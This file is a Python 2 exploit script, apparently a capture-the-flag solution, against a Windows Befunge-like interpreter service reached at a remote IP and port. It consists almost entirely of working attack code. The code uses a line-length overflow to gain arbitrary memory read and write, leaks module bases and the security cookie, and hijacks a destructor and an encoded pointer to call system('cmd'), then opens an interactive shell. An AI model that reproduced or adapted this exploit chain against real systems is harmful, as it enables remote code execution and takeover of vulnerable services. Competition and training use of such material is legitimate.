### This exploit is based on a Windows environment with python2 + customized pwintools(https://github.com/leesh3288/pwintools)
### Else, one can carve through all the DLLs and hardcode their offsets
from pwintools import *

binary = PE(r'..\dist\winterpreter.exe')
k32 = PE(r'..\dist\libs\kernel32.dll')
ntdll = PE(r'..\dist\libs\ntdll.dll')
ucrt = PE(r'..\dist\libs\ucrtbase.dll')
msvcp = PE(r'..\dist\libs\msvcp140.dll')
vcrt = PE(r'..\dist\libs\vcruntime140.dll')
p = Remote('183.107.102.15', 54321)
p.timeout = 5000

PAYLOAD_LEN = 14
MAXH = 25
MAXW = 80
LIMW = 15

def cmd(s):
    p.recvuntil('> ')
    p.sendline(s)

def put(x, y, v):
    cmd('stop')
    cmd('run')
    cmd('cycle 1000')
    p.sendline('1')
    p.sendline('1')
    p.sendline(str(v))
    p.sendline(str(x))
    p.sendline(str(y))

def put_qword(x, y, v):
    cmd('stop')
    cmd('run')
    cmd('cycle 1000')
    p.sendline('1')
    p.sendline('0')
    p.sendline(str(y))
    for i, c in enumerate(p64(v)):
        p.sendline(str(ord(c)))
        p.sendline(str(x + i))

def get(x, y):
    cmd('stop')
    cmd('run')
    cmd('cycle 1000')
    p.sendline('0')
    p.sendline('1')
    p.sendline('1')
    p.sendline(str(x))
    p.sendline(str(y))
    return chr(int(p.recvuntil(' ', drop = True)))

def get_qword(x, y):
    cmd('stop')
    cmd('run')
    cmd('cycle 1000')
    p.sendline('0')
    p.sendline('1')
    p.sendline('0')
    p.sendline(str(y))
    for i in range(8):
        p.sendline(str(x + i))
    return u64(''.join(chr(int(p.recvuntil(' ', drop = True))) for _ in range(8)))

def run(payload, aux = ''):
    assert(len(payload) <= PAYLOAD_LEN)
    for i, c in enumerate(payload.ljust(PAYLOAD_LEN, ' ')):
        put(i + 1, MAXH - 2, ord(c))
    cmd('stop')
    cmd('run')
    cmd('cycle 1000')
    p.sendline('0')
    p.sendline('0')
    for c in aux:
        p.sendline(str(ord(c)))

# overwrite std::string[MAXH - 1] structure
def mem_init(addr, length = MAXW, capacity = 0x10):
    put_qword(0x20, MAXH - 2, addr)
    put_qword(0x30, MAXH - 2, length)
    put_qword(0x38, MAXH - 2, capacity)

def mem_read_qword(ofs):
    assert(ofs in range(0, MAXW - 8))
    return get_qword(ofs, MAXH - 1)

def mem_write_qword(ofs, v):
    assert(ofs in range(0, MAXW - 8))
    return put_qword(ofs, MAXH - 1, v)

def ROR8(data, rot):
    return ((data >> rot) | (data << (0x40 - rot))) & ((1 << 0x40) - 1)

def _decode_pointer(ptr, cookie):
    return ROR8(ptr, 0x40 - (cookie & 0x3f)) ^ cookie

# arbitrary put&get + code runner
code = [
'v >&&&p@',  # 1, 1 (put)
'#  ',
'>&|',
'&  ',
'# >&' + r':&\&\p'*8 + '@',  # 1, 0 (put_qword)
'   ',
'| >&&g.@',  # 0, 1, 1 (get)
'#  ',
'>&|',
'&  ',
'# >&' + r':&\g.'*8 + '@',  # 0, 1, 0 (get_qword)
'   ',
'|',
'',
'',
'',
'',
'',
'',
'',
'',
'',
'',
'>', # 0, 0 (run)
'',  # last line for completely arbitrary RW (mem_*)
]
assert(max(len(line) for line in code) <= MAXW)
assert(len(code) == MAXH)

p.sendline('{} {}'.format(MAXW, MAXH))
for codeline in code:
    p.sendline(codeline.ljust(LIMW, ' '))

run('&            s', 's')  # overflow: "s"
run('&           # ', chr(0xff))  # overflow: "s\xff" => code.inst[MAXH - 2].length = 0xff

# leak executable image base from LEFT.x
img_base = get_qword(0x48, MAXH - 2) - 0xE4F8
log.info('winterpreter.exe base: 0x{:016x}'.format(img_base))
assert(img_base & 0xffff == 0)

# leak DLL base from imports
# we only need ucrtbase.dll leak, the others are for illustration
mem_init(img_base + binary.sections['.rdata'][0] + 0xD0)
k32_base = mem_read_qword(0) - k32.symbols['InitializeCriticalSectionAndSpinCount']
ntdll_base = mem_read_qword(0x8) - ntdll.symbols['RtlLeaveCriticalSection']
msvcp_base = mem_read_qword(0x28) - msvcp.symbols['?snextc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHXZ']

mem_init(img_base + binary.sections['.rdata'][0] + 0x298)
vcrt_base = mem_read_qword(0) - vcrt.symbols['_CxxThrowException']
ucrt_base = mem_read_qword(0x10) - ucrt.symbols['malloc']

log.info('kernel32.dll base: 0x{:016x}'.format(k32_base))
log.info('ntdll.dll base: 0x{:016x}'.format(ntdll_base))
log.info('ucrtbase.dll base: 0x{:016x}'.format(ucrt_base))
log.info('msvcp140.dll base: 0x{:016x}'.format(msvcp_base))
log.info('vcruntime140.dll base: 0x{:016x}'.format(vcrt_base))
assert(reduce(lambda x, y: x | y, [k32_base, ntdll_base, ucrt_base, msvcp_base, vcrt_base]) & 0xffff == 0)

# leak __security_cookie (ofs 0xE020)
cookie_addr = img_base + 0xE020
mem_init(cookie_addr)
cookie = mem_read_qword(0)
log.info('__security_cookie: 0x{:016x}'.format(cookie))

# overwrite std::_Fac_head (ofs 0xF930) such that destructor calls _Init_thread_notify (ofs 0x87D8)
scratch = img_base + 0xF000  # originally space for mt19937_64 object
destructor_ptr = img_base + 0xF930
mem_init(scratch)
mem_write_qword(0, scratch)
mem_write_qword(8, scratch + 8)
mem_write_qword(0x18, img_base + 0x87D8)
mem_init(destructor_ptr)
mem_write_qword(0, scratch)

# write appropriate command @ _Tss_cv (ofs 0xF9B0)
write_base = img_base + 0xF9B0
mem_init(write_base)
mem_write_qword(0, u64("cmd\0\0\0\0\0"))

# overwrite _Tss_event to zero (ofs 0xF9B8)
mem_write_qword(8, 0)

# overwrite encoded_wake_all_condition_variable (ofs 0xF9C8)
mem_write_qword(0x18, _decode_pointer(ucrt_base + ucrt.symbols['system'], cookie))

# reset to normal, prevent crashing at std::string destructor
mem_init(img_base + binary.sections['.rdata'][0] + 0xF0, 0xf, 0xf)

# trigger exploit
cmd('quit')

p.interactive()